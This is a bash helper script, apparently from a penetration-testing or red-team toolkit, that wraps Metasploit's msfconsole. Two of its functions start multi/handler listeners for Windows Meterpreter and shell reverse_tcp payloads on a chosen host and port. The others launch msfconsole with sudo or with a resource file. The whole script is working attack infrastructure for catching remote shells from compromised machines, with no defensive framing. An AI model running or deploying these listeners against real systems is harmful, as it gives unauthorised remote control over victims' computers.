#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")


start_msfconsole_meterpreter_listener() {
    echo "Starting Metasploit console..."
    get_listener_command 443
    if ! pgrep -f "msfconsole" > /dev/null; then
        msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $host_ip;set LPORT $host_port;run;"
    fi
}

start_msfconsole_generic_listener() {
    echo "Starting Metasploit console..."
    if [[ -z $payload ]]; then
        payload=windows/shell/reverse_tcp
        echo "Payload not specified. Using default: $payload"
    fi
    get_listener_command 443
    if ! pgrep -f "msfconsole" > /dev/null; then
        msfconsole -x "use exploit/multi/handler;set payload $payload;set LHOST $host_ip;set LPORT $host_port;run;"
    fi
}

start_msfconsole() {
    if ! pgrep -f "msfconsole" > /dev/null; then
        sudo msfconsole
    fi
}

start_msfconsole_rcfile() {
    echo "Starting Metasploit console with resource file..."
    if [[ -z $metasploit_rc_file ]]; then
        echo "Resource file not specified."
        return 1
    fi
    if ! pgrep -f "msfconsole" > /dev/null; then
        sudo msfconsole -r $metasploit_rc_file
    fi
}